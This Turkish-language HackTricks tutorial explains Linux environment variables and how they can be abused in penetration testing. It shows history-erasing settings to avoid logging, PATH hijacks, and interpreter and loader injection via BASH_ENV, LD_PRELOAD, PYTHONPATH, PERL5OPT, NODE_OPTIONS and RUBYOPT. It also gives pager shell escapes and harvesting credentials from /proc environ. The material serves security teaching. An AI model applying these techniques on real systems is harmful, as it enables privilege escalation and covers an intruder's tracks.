# Linux Ortam Değişkenleri

{{#include ../../banners/hacktricks-training.md}}

## Global değişkenler

Global değişkenler **alt süreçler** tarafından miras alınır.

Şunları yaparak mevcut oturumunuz için global bir değişken oluşturabilirsiniz:
```bash
export MYGLOBAL="hello world"
echo $MYGLOBAL #Prints: hello world
```
Bu değişkene mevcut oturumlarınız ve bunların alt süreçleri tarafından erişilebilir.

Bir değişkeni şu şekilde **kaldırabilirsiniz**:
```bash
unset MYGLOBAL
```
## Local variables

**Yerel değişkenlere** yalnızca **mevcut shell/script** tarafından **erişilebilir**.
```bash
LOCAL="my local"
echo $LOCAL
unset LOCAL
```
## Mevcut değişkenleri listele
```bash
set
env
printenv
cat /proc/$$/environ
cat /proc/`python -c "import os; print(os.getppid())"`/environ
```
`/proc/*/environ` içerikleri **NUL ile ayrılmış** olduğundan, şu varyantları okumak genellikle daha kolaydır:
```bash
tr '\0' '\n' </proc/$$/environ | sort -u
tr '\0' '\n' </proc/<PID>/environ | sort -u
```
Devralınan ortamlarda **credentials** veya **ilginç servis yapılandırması** arıyorsanız [Linux Post Exploitation](../post-exploitation/linux-post-exploitation/README.md) bölümünü de kontrol edin.

## Yaygın değişkenler

Kaynak: [https://geek-university.com/linux/common-environment-variables/](https://geek-university.com/linux/common-environment-variables/)<sup>[[5]](#references)</sup>

- **DISPLAY** – **X** tarafından kullanılan display. Bu değişken genellikle **:0.0** olarak ayarlanır; bu, mevcut bilgisayardaki ilk display anlamına gelir.
- **EDITOR** – kullanıcının tercih ettiği text editor.
- **HISTFILESIZE** – history file içinde bulunan maksimum satır sayısı.
- **HISTSIZE** – kullanıcı oturumunu sonlandırdığında history file'a eklenen satır sayısı.
- **HOME** – home directory'niz.
- **HOSTNAME** – bilgisayarın hostname'i.
- **LANG** – geçerli diliniz.
- **MAIL** – kullanıcının mail spool konumu. Genellikle **/var/spool/mail/USER**.
- **MANPATH** – manual page'leri aramak için kullanılacak directory listesi.
- **OSTYPE** – operating system türü.
- **PS1** – bash'teki varsayılan prompt.
- **PATH** – çalıştırmak istediğiniz binary file'ları, file adını relative veya absolute path belirtmeden doğrudan belirterek çalıştırabilmeniz için bu file'ları barındıran tüm directory'lerin path'ini tutar.
- **PWD** – mevcut working directory.
- **SHELL** – mevcut command shell'in path'i (örneğin, **/bin/bash**).
- **TERM** – mevcut terminal türü (örneğin, **xterm**).
- **TZ** – time zone'unuz.
- **USER** – mevcut username'iniz.

## Hacking için ilginç değişkenler

Her değişken aynı derecede kullanışlı değildir. Offensive perspective açısından **search path'lerini**, **startup file'larını**, **dynamic linker davranışını** veya **audit/logging** işlemlerini değiştiren değişkenlere öncelik verin.

### **HISTFILESIZE**

**Oturumunuzu sonlandırdığınızda** **history file'ın** (\~/.bash_history) **0 satıra kısaltılması** için **bu değişkenin değerini 0 olarak değiştirin**.
```bash
export HISTFILESIZE=0
```
### **HISTSIZE**

Komutların **bellek içi geçmişte tutulmaması** ve **geçmiş dosyasına** (\~/.bash_history) geri yazılmaması için bu **değişkenin değerini 0** olarak değiştirin.
```bash
export HISTSIZE=0
```
### **HISTCONTROL**

**Bu değişkenin değeri `ignorespace` veya `ignoreboth` olarak ayarlanırsa**, başına fazladan bir boşluk eklenen hiçbir komut geçmişe kaydedilmez.
```bash
export HISTCONTROL=ignorespace
```

```bash
$ echo "to save or"
$  echo "not to save"
```
### **HISTFILE**

**Geçmiş dosyasını** **`/dev/null`** konumuna yönlendirin veya tamamen ayarını kaldırın. Bu, yalnızca geçmiş boyutunu değiştirmekten genellikle daha güvenilirdir.
```bash
export HISTFILE=/dev/null
unset HISTFILE
```
### http_proxy & https_proxy

Süreçler, **http veya https** üzerinden internete bağlanmak için burada tanımlanan **proxy**'yi kullanır.
```bash
export http_proxy="http://10.10.10.10:8080"
export https_proxy="http://10.10.10.10:8080"
```
### all_proxy & no_proxy

- `all_proxy`: bunu dikkate alan tools/protocols için varsayılan proxy.
- `no_proxy`: doğrudan bağlanması gereken bypass listesi (hosts/domains/CIDRs).
```bash
export all_proxy="socks5h://10.10.10.10:1080"
export no_proxy="localhost,127.0.0.1,.corp.local,10.0.0.0/8"
```
Hem küçük harfli hem de büyük harfli varyantlar araca bağlı olarak kullanılabilir (`http_proxy`/`HTTP_PROXY`, `no_proxy`/`NO_PROXY`).

### SSL_CERT_FILE & SSL_CERT_DIR

İşlemler, **bu ortam değişkenlerinde** belirtilen sertifikalara güvenecektir. Bu, **`curl`**, **`git`**, Python HTTP istemcileri veya paket yöneticileri gibi araçların saldırgan tarafından kontrol edilen bir CA'ya güvenmesini sağlamak için kullanışlıdır (örneğin, bir interception proxy'sinin meşru görünmesini sağlamak için).
```bash
export SSL_CERT_FILE=/path/to/ca-bundle.pem
export SSL_CERT_DIR=/path/to/ca-certificates
```
### **PATH**

Ayrıcalıklı bir wrapper/script komutları **absolute path** olmadan çalıştırıyorsa, `PATH` içindeki saldırgan kontrollü ilk directory kazanır. Bu, `sudo`, cron jobs, shell wrapper'ları ve özel SUID helper'larındaki birçok **PATH hijacks** tekniğinin temelindeki primitive'dir. `env_keep+=PATH`, zayıf `secure_path` veya `tar`, `service`, `cp`, `python` gibi komutları isimleriyle çağıran wrapper'ları arayın.
```bash
mkdir -p /dev/shm/bin
cat > /dev/shm/bin/tar <<'EOF'
#!/bin/sh
echo '[+] PATH hijack reached' >&2
id
EOF
chmod +x /dev/shm/bin/tar
PATH=/dev/shm/bin:$PATH vulnerable-wrapper
```
`PATH` kötüye kullanılarak gerçekleştirilen tam privilege-escalation zincirleri için [Linux Privilege Escalation](linux-privilege-escalation/README.md) bölümüne bakın.

### **HOME & XDG_CONFIG_HOME**

`HOME` yalnızca bir dizin referansı değildir: birçok araç **dotfiles**, **plugin'leri** ve **kullanıcı başına yapılandırmayı** `$HOME` veya `$XDG_CONFIG_HOME` üzerinden otomatik olarak yükler. Ayrıcalıklı bir workflow bu değerleri korursa, **config injection** binary hijacking işleminden daha kolay olabilir.
```bash
export HOME=/dev/shm/fakehome
export XDG_CONFIG_HOME=/dev/shm/fakehome/.config
mkdir -p "$XDG_CONFIG_HOME"
```
İlginç hedefler arasında `.gitconfig`, `.wgetrc`, `.curlrc`, `.inputrc`, `.pythonrc.py` ve `.terraformrc` gibi araca özgü dosyalar bulunur.

### **LD_PRELOAD, LD_LIBRARY_PATH & LD_AUDIT**

Bu değişkenler **dynamic linker**'ı etkiler:

- `LD_PRELOAD`: Ek shared object'lerin önce yüklenmesini zorlar.
- `LD_LIBRARY_PATH`: Library search dizinlerinin başına ekleme yapar.
- `LD_AUDIT`: Library loading ve symbol resolution işlemlerini gözlemleyen auditor library'lerini yükler.

Ayrıcalıklı bir komut bunları koruyorsa **hooking**, **instrumentation** ve **privilege escalation** için son derece değerlidirler. **secure-execution** modunda (`AT_SECURE`, ör. setuid/setgid/capabilities), loader bu değişkenlerin çoğunu kaldırır veya kısıtlar. Ancak bu erken loader aşamasındaki parser hataları, hedef programdan **önce** çalıştıkları için hâlâ yüksek etkiye sahiptir.<sup>[[2]](#references)</sup>
```bash
env | grep -E '^LD_'
ldso=$(ls /lib64/ld-linux-*.so.* /lib/*-linux-gnu/ld-linux-*.so.* 2>/dev/null | head -n1)
"$ldso" --list-diagnostics /bin/true | head
"$ldso" --list-tunables /bin/true | head
```
### **GLIBC_TUNABLES**

`GLIBC_TUNABLES`, glibc'nin erken aşamadaki davranışını (örneğin allocator tunable'larını) değiştirir ve exploit lab'lerinde oldukça kullanışlıdır. Ayrıca güvenlik açısından da önemlidir, çünkü **dynamic loader bunu çok erken aşamada parse eder**. 2023'teki **Looney Tunables** bug'ı, loader'da parse edilen tek bir environment variable'ın SUID programlarına karşı **yerel ayrıcalık yükseltme primitive'ine** dönüşebileceğini hatırlattı.<sup>[[6]](#references)</sup>
```bash
GLIBC_TUNABLES=glibc.malloc.tcache_count=0 ./binary
```
### **BASH_ENV & ENV**

**Bash** **etkileşimsiz** başlatılırsa, hedef script'i çalıştırmadan önce `BASH_ENV` değişkenini kontrol eder ve belirtilen dosyayı source eder. Bash `sh` olarak çağrıldığında veya POSIX tarzı etkileşimli modda çalıştırıldığında `ENV` değişkenine de bakılabilir. Bu, ortamın saldırgan tarafından kontrol edildiği durumlarda bir shell wrapper'ını code execution'a dönüştürmenin klasik bir yoludur.
```bash
cat > /tmp/pre.sh <<'EOF'
echo '[+] sourced before the target script'
EOF
BASH_ENV=/tmp/pre.sh bash -c 'echo target'
```
Bash, **gerçek/etkin ID'ler farklı olduğunda** `-p` kullanılmadıkça bu startup dosyalarını kendisi devre dışı bırakır; bu nedenle kesin davranış, wrapper'ın shell'i nasıl başlattığına bağlıdır. Bash'i başlatmadan **önce** `setuid()`/`setgid()` çağıran ayrıcalıklı wrapper'lara dikkat edin: ID'ler yeniden eşleştiğinde Bash, normalde yok sayacağı `BASH_ENV`, `ENV` ve ilgili shell durumuna güvenebilir.<sup>[[1]](#references)</sup>

### **PYTHONPATH, PYTHONHOME, PYTHONSTARTUP & PYTHONINSPECT**

Bu değişkenler Python'ın nasıl başlatılacağını değiştirir:

- `PYTHONPATH`: import arama yollarının önüne ekleme yapar.
- `PYTHONHOME`: standart library tree'nin konumunu değiştirir.
- `PYTHONSTARTUP`: interactive prompt'tan önce bir dosya çalıştırır.
- `PYTHONINSPECT=1`: bir script tamamlandıktan sonra interactive mode'a geçer.

Bunlar, Python'ı kontrol edilebilir bir environment ile çağıran maintenance script'lerine, debugger'lara, shell'lere ve wrapper'lara karşı kullanışlıdır. `python -E` ve `python -I`, tüm `PYTHON*` değişkenlerini yok sayar.
```bash
mkdir -p /tmp/pylib
printf 'print("owned from PYTHONPATH")\n' > /tmp/pylib/htmod.py
PYTHONPATH=/tmp/pylib python3 -c 'import htmod'
PYTHONPATH=/tmp/pylib python3 -I -c 'import htmod'   # ignored in isolated mode
```
Yakın tarihli gerçek dünya örneklerinden biri, Ubuntu/Debian sistemlerindeki 2024 **needrestart** LPE'siydi: root sahipli scanner, ayrıcalıksız bir process'in `PYTHONPATH` değerini `/proc/<PID>/environ` üzerinden kopyalıyor ve ardından Python'ı çalıştırıyordu. Yayınlanan exploit, attacker-controlled path içine `importlib/__init__.so` yerleştirerek Python'ın kendi initialization süreci sırasında, helper'ın hard-coded script'i henüz önem kazanmadan önce attacker code çalıştırmasını sağladı.<sup>[[3]](#references)</sup>

### **PERL5OPT & PERL5LIB**

Perl'in de benzer şekilde kullanışlı startup variable'ları vardır:

- `PERL5LIB`: library directory'lerini prepend eder.
- `PERL5OPT`: switch'leri her `perl` command line'ında yer alıyormuş gibi inject eder.

Bu, hedef script ilginç herhangi bir işlem yapmadan önce **automatic module loading** işlemini zorlayabilir veya interpreter davranışını değiştirebilir. Perl, **taint / setuid / setgid** context'lerinde bu variable'ları yok sayar; ancak normal root-run wrapper'lar, CI job'ları, installer'lar ve custom sudoers rule'ları için hâlâ oldukça önemlidir.
```bash
mkdir -p /tmp/perllib
cat > /tmp/perllib/HT.pm <<'EOF'
package HT;
BEGIN { print "PERL5OPT_TRIGGERED\n" }
1;
EOF
PERL5LIB=/tmp/perllib PERL5OPT=-MHT perl -e 'print "target\n"'
```
### **NODE_OPTIONS**

`NODE_OPTIONS`, ortamı devralan her `node` process'ine **Node.js CLI flags** ekler. Bu özellik, sonunda Node çağıran wrapper'lara, CI job'larına, Electron yardımcılarına ve sudo kurallarına karşı kullanılmasını sağlar. Offensively en ilgi çekici flag'ler genellikle şunlardır:

- `--require <file>`: hedef script'ten önce bir CommonJS dosyasını preload eder.
- `--import <module>`: hedef script'ten önce bir ES module'ü preload eder.

Node, bazı tehlikeli flag'lerin `NODE_OPTIONS` içinde kullanılmasını reddeder; ancak `--require` ve `--import` açıkça izin verilen flag'lerdir ve normal command-line argümanlarından **önce** işlenirler.<sup>[[4]](#references)</sup>
```bash
cat > /tmp/preload.js <<'EOF'
console.error('[+] NODE_OPTIONS preload reached')
EOF
NODE_OPTIONS='--require /tmp/preload.js' node -e 'console.log("target")'
```
Uzak gadget chain'leri dolaylı olarak `NODE_OPTIONS` ayarlıyorsa (örneğin, prototype-pollution ile RCE), [bu diğer sayfaya](../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce.md) bakın.

### **RUBYLIB & RUBYOPT**

Ruby aynı tür başlangıç istismarını sunar:

- `RUBYLIB`: Dizinleri Ruby'nin load path'inin başına ekler.
- `RUBYOPT`: Her `ruby` invocation'ına `-r` gibi command-line option'lar inject eder.
```bash
mkdir -p /tmp/rubylib
printf 'warn "[+] RUBYOPT preload reached"\n' > /tmp/rubylib/ht.rb
RUBYLIB=/tmp/rubylib RUBYOPT='-rht' ruby -e 'puts :target'
```
2024 **needrestart** zafiyetleri, bunun yalnızca bir lab hilesi olmadığını gösterdi: `PYTHONPATH` abuse'a karşı savunmasız olan aynı root-owned helper, attacker-controlled bir `RUBYLIB` ile Ruby çalıştırmaya ve attacker directory içindeki `enc/encdb.so` dosyasını yüklemeye de zorlanabiliyordu.<sup>[[3]](#references)</sup>

### **PAGER, MANPAGER, GIT_PAGER, GIT_EDITOR & LESSOPEN**

Bazı araçlar environment'dan yalnızca bir path okumaz; değeri bir **shell**'e, bir **editor**'e veya bir **input preprocessor**'a iletir. Bu nedenle aşağıdaki variable'lar, privileged bir wrapper `git`, `man`, `less` veya benzer text viewer'ları çalıştırdığında özellikle ilgi çekicidir:

- `PAGER`, `MANPAGER`, `GIT_PAGER`: pager command'ını seçer.
- `GIT_EDITOR`, `VISUAL`, `EDITOR`: genellikle arguments ile birlikte editor command'ını seçer.
- `LESSOPEN`, `LESSCLOSE`: `less` bir file açtığında çalıştırılan pre/post-processor'ları tanımlar.
```bash
PAGER='sh -c "exec sh 0<&1 1>&1"' man man

cat > /tmp/lesspipe.sh <<'EOF'
#!/bin/sh
echo '[+] LESSOPEN triggered' >&2
cat "$1"
EOF
chmod +x /tmp/lesspipe.sh
LESSOPEN='|/tmp/lesspipe.sh %s' less /etc/hosts
```
Git ayrıca diske dokunmadan yalnızca env üzerinden **config injection** için `GIT_CONFIG_COUNT`, `GIT_CONFIG_KEY_<n>` ve `GIT_CONFIG_VALUE_<n>` değişkenlerini destekler:
```bash
GIT_CONFIG_COUNT=1 \
GIT_CONFIG_KEY_0=core.pager \
GIT_CONFIG_VALUE_0='sh -c "exec sh 0<&1 1>&1"' \
git -p help
```
Post-exploitation perspektifinden, devralınan ortamların genellikle **credentials**, **proxy settings**, **service tokens** veya **cloud keys** içerdiğini de unutmayın. `/proc/<PID>/environ` ve `systemd` `Environment=` araştırması için [Linux Post Exploitation](../post-exploitation/linux-post-exploitation/README.md) sayfasına bakın.

### PS1

Prompt'unuzun görünümünü değiştirin.

[**Bu bir örnektir**](https://gist.github.com/carlospolop/43f7cd50f3deea972439af3222b68808)

Root:

![PERL5OPT & PERL5LIB - PS1: Bu bir örnektir](<../images/image (897).png>)

Normal kullanıcı:

![PERL5OPT & PERL5LIB - PS1: Arka planda çalışan bir, iki ve üç job](<../images/image (740).png>)

Arka planda çalışan bir, iki ve üç job:

![PERL5OPT & PERL5LIB - PS1: Arka planda çalışan bir, iki ve üç job](<../images/image (145).png>)

Bir background job, durdurulmuş bir job ve son komut doğru şekilde tamamlanmadı:

![PERL5OPT & PERL5LIB - PS1: Bir background job, durdurulmuş bir job ve son komut doğru şekilde tamamlanmadı](<../images/image (715).png>)

## Referanslar

- [1] [GNU Bash Manual - Bash Başlangıç Dosyaları](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html)
- [2] [ld.so(8) - Linux manual page](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [3] [Qualys - needrestart içindeki LPE'ler](https://www.qualys.com/2024/11/19/needrestart/needrestart.txt)
- [4] [Node.js CLI documentation - `NODE_OPTIONS`](https://nodejs.org/api/cli.html)
- [5] [Yaygın environment variables - Geek University](https://geek-university.com/linux/common-environment-variables/)
- [6] [CVE-2023-4911: Looney Tunables - glibc'nin ld.so'sunda Local Privilege Escalation - Qualys](https://blog.qualys.com/vulnerabilities-threat-research/2023/10/03/cve-2023-4911-looney-tunables-local-privilege-escalation-in-the-glibcs-ld-so)

{{#include ../../banners/hacktricks-training.md}}
